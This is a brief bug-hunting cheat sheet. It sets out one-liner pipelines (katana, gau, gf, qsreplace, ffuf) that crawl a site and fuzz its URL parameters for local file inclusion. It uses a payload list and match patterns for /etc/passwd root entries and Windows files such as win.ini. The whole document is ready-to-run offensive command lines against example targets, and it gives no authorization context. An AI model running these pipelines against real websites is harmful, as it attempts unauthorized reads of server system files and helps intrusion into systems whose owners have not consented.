
## **LFI Vulnerabilities**

```bash 
echo "example.com" | katana -o katana.txt

cat katana.txt | sort -u | urldedupe > urls.txt

cat urls.txt | gf lfi | qsreplace FUZZ > lfi.txt

cat lfi.txt | while read url; do ffuf -u $url -w payloads.txt -mr "root:x"; done

```

## **LostSec's One Liner Methodology** 

**Unix**
```bash
echo "https://cat.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w ~/Tools/loxs/payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v

echo "https://cat.com/" | katana | gf lfi | urldedupe | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w ~/Tools/loxs/payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
```

**Windows**
```bash
echo "https://cat.com/" | katana | gf lfi | urldedupe | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w  ~/Tools/loxs/payloads/lfi.txt -c -mr "(\[extensions\]|\[fonts\]|\[boot loader\]|\[operating systems\]|127\.0\.0\.1\s|localhost\s|[A-Z]:\\|system32|windows\\win\.ini)" -v
```


